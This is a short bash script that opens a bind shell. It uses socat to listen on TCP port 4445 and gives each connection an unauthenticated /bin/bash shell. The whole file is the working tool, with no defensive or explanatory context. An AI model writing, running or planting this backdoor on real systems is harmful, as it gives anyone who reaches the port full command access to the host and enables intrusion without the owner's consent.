#!/bin/bash
# Bind shell on port 4445
PORT=4445
socat TCP-LISTEN:$PORT,fork EXEC:/bin/bash
